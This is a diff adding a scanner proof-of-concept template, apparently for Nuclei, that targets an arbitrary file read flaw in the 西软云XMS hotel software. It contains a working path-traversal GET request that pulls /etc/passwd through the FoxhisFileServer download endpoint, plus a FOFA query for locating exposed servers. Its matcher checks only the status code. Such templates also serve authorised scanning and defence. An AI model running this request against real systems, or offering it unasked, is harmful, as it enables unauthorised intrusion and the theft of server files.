@@ -1,0 +1,27 @@
+id: poc-icvhox2y1246q9fw
+info:
+  name: 西软云XMS download 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/icvhox2y1246q9fw'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: icvhox2y1246q9fw
+    fofa: (body="href=\"xmsenv.exe\">系统运行环境" || title="西软云XMS") && body="请选择服务器"
+http:
+- raw:
+  - 'GET /FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
